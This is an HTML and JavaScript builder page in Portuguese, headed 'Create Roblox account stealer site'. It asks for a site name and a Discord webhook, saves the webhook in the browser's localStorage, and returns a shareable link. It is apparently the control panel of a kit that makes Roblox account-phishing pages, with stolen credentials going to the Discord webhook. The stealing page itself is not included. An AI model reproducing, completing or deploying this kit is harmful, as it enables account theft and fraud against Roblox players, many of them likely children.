<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Cookie â€¢ Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: #0f0f0f;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    .box {
      max-width: 500px;
      margin: 80px auto;
      background: #1c1c1c;
      padding: 24px;
      border-radius: 14px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      border-radius: 10px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #2a2a2a;
      color: #fff;
    }
    button {
      background: #5865F2;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
    .link {
      background: #111;
      padding: 10px;
      border-radius: 8px;
      word-break: break-all;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <div class="box">
    <h2>Criar site Roubador de Contas Roblox</h2>
    <p>By TobyxxzzðŸ˜ˆ</p>

    <input id="nome" placeholder="nome-do-site">
    <input id="webhook" placeholder="Webhook do Discord">

    <button onclick="criar()">Criar site</button>

    <div id="out" style="display:none">
      <h3>Link do site</h3>
      <div class="link" id="link"></div>
      <button onclick="copiar()">Copiar link</button>
    </div>
  </div>

  <script>
    function criar() {
      const nome = document.getElementById("nome").value.trim();
      const webhook = document.getElementById("webhook").value.trim();

      if (!nome || !webhook) {
        alert("Preencha");
        return;
      }

      localStorage.setItem("webhook_" + nome, webhook);

      const url = location.origin + "/" + nome;
      document.getElementById("link").innerText = url;
      document.getElementById("out").style.display = "block";
    }

    function copiar() {
      navigator.clipboard.writeText(
        document.getElementById("link").innerText
      );
      alert("Copiado!");
    }
  </script>

</body>
</html>
